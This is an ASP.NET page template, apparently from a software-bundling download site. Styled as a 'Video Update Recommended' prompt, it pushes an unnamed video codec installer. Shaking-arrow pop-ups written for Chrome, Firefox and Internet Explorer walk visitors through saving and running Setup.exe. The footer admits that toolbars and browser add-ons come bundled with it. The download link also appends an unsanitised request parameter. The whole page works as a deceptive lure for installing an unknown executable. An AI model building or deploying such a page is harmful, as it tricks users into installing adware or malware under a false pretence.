<%@ Page Language="C#" %>
<%
    string Download_URL = System.Configuration.ConfigurationManager.AppSettings["download_url"] ;
    Download_URL += Request["uid"];
     %>
	 
<html xmlns="http://www.w3.org/1999/xhtml">

<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    
	<script type="text/javascript" src="js/linkv2.js"></script>
    <script type="text/javascript" src="js/ainj.js"></script>
    <script type="text/javascript" src="js/dlStoragev1.js"></script>
    

    <base href="." target="_self">
    

    
    <title>Video Update Recommended</title>
    
    
    
    <link href="js/style.css" rel="stylesheet" type="text/css">
    <link href="js/modals-b.css" rel="stylesheet" type="text/css">
    <script src="js/jquery.min.js" type="text/javascript"></script>
    <script src="js/jquery-ui-1.10.4.custom.min.js" type="text/javascript"></script>
    <script type="text/javascript" src="js/browserdetector.js"></script>
    

  
    
    

</head>

<body>
    <!-- modales navegadores -->
    <!-- chrome -->
    <div id="DirectionsModal_cr" class="modal-container" style="display: none; ">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-chrome-arrow"></div>
          <div class="modal-chrome">
            <div class="col1">
                <h3>Step one</h3>
                <h4>Click</h4>
                <h5>Setup.exe</h5>
                <div id="loadingchrome" style="display: block;"></div>
            </div>
            <div class="col2">
                <h3>Step two</h3>
                <h4>Click <span>"Run"</span> when it appears</h4>
            </div>
            <div class="clear20"></div>
          </div>
        </div>
    </div>

    <!-- firefox -->
    <div id="DirectionsModal_ff" class="modal-container" style="display: none; ">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-ff-arrow"></div>
          <div class="modal-ff">
            <div class="col1">
                <h3>Step one</h3>
                <h4>Click “Save file”</h4>
            </div>
            <div class="col2">
                <h3>Step two</h3>
                <h4>Click the small download arrow above 
                    
                    
                </h4>
            </div>
            <div class="col3">
                <h3>Step three</h3>
                <h4>Click the downloaded file</h4>
            </div>
            <div class="clear10"></div>
          </div>
        </div>
    </div>

    <!-- explorer default --> 
    <div id="DirectionsModal_ie" class="modal-container" style="display: none;">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-ie-arrow"></div>
            <div class="modal-ie-2-arrow"></div>
            <div class="modal-ie"> 
                <h4>Click <span>“Run/Save”</span> to download</h4>                
                <div class="clear10"></div>
            </div>
        </div>  
    </div>
    <!-- explorer ie8 --> 
    <div id="DirectionsModal_ie8" class="modal-container" style="display: none;">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-ie-8"> 
                <div class="col1">
                    <h3>Step one</h3>
                    <h4>Right click on the information bar and click on <span>"Download File..."</span></h4>
                </div>
                <div class="col2">
                    <h3>Step two</h3>
                    <h4>Click on "Run"</h4>
                </div>
                <div class="col2">
                    <h3>Step three</h3>
                    <h4>Click on "Open"</h4>
                </div>
                <div class="col2">
                    <h3>Step four</h3>
                    <h4>Click on "Yes" to proceed with the instalation</h4>
                </div>
            </div>
        </div>  
    </div>
    <!--fin de modal de navegador-->
    



    <div class="wrap">

      <div class="content">
        <div class="headtittle">
            
            <p>Recommended Download</p>
            
        </div>
        <div class="left">
             
                <div class="logo"></div>
            
        </div>
        
        <div class="right">
            
            <h1>Please install the new Video Software <span> (RECOMMENDED)</span> </h1>
            
            <ul>
                <li>Based on ffmpeg the leading Audio/Video codec library</li>
                <li>Supports *.FLV, *.AVI, *.MOV, *.MKV, *.SWF and more</li>
                <li>Super fast and user-friendly interface</li>
                <li>100% Free &amp; Safe-share it with your friends</li>
            </ul>

            
            <p class="grey">Downloading takes a few seconds and no restart needed after installation</p>
            

            <div class="separate">
            </div>

            <div class="buttons">
                
                <a rel="noreferrer" href="<%= Download_URL%>" class="button right">DOWNLOAD</a>
                
                <a rel="noreferrer" href="<%= Download_URL%>"  class="buttonl left">INSTALL</a>
            </div>

        </div>
    </div>
    <div class="clear"></div>

    

</div>




        
        
<script type="text/javascript">

function generateLinkLee(v_dlink)
{
       var link = v_dlink + '?' + location.search.substring(1); 
       location.href = link;
       return false;
}

</script>

	<div class="footer">
		<p>dlwlyoursoftlist.com is distributing an install manager that will manage the installation of your selected software. In addition to managing the installation of your selected software, this install manager will make recommendations for additional free software that you may be interested in. Additional software may include toolbars, browser add-ons, game applications, anti-virus applications and other types of applications. You are not required to install any additional software to receive your selected software. You can completely remove the program at any time in Windows 'Add/Remove Programs'. At the time of downloading you accept the below conditions of use and privacy policies </span></p>
		    <ul>
		    		
		            <li><a href="terms.html" target="_blank">Terms &amp; Conditions</a></li>
		            <li><a href="privacy.html" target="_blank">Privacy Policy</a></li>
		          
		    </ul>
	</div>
        
        


    

<script type="text/javascript">
    var BrID = BrowserDetect.bwshort; var BrVE = BrowserDetect.version;
    
    var dvBrid = $('#DirectionsModal_'+BrID+BrVE).length > 0 ? '#DirectionsModal_'+BrID+BrVE :
               $('#DirectionsModal_'+BrID).length > 0 ? '#DirectionsModal_'+BrID :
               $('#DirectionsModal').length > 0 ? '#DirectionsModal' : null;
    
    function shaker() {
        var arrow = $(dvBrid+" div[class$=arrow]");
        if (arrow.length > 0){
            arrow.effect('shake', { 
                direction: "up", 
                distance: 8, 
                times:3 
            }, 2000);
            setTimeout(shaker, 2000);
        }
    }

    $(".showmodal").click(function() {   
        if (dvBrid){
            $(dvBrid).fadeIn("300");
            $("#loadingchrome").show();             
            setTimeout('$("#loadingchrome").fadeOut("300");', 3000);
            setTimeout(shaker, 500);
        }
    });

    $(".modal-container").click(function() { 
        if (dvBrid){
            $(dvBrid).fadeOut("300");
        }
    });


    function modal() {

        if (BrowserDetect.browser == "Firefox") { 
          $("#DirectionsModal_ff").fadeIn("300");
          var shake = setInterval(shaker, 0);
        } 
        else if (BrowserDetect.browser == "Explorer")
        {
            $("#DirectionsModal_ie").fadeIn("300");
            var shake = setInterval(shaker, 0);          
        }
        else if(BrowserDetect.browser == "Chrome")
        {
            $("#DirectionsModal_cr").fadeIn("300");          
            var shake = setInterval(shaker, 0);
        }else{
          //$(".default").show();
        }
      }

    
</script>
   




    <script>
        //get system date
        var f = new Date();
        //Insert year into span with id "datec" (date copyright).
        document.getElementById('datec').innerHTML = f.getFullYear();
    </script>



</body></html>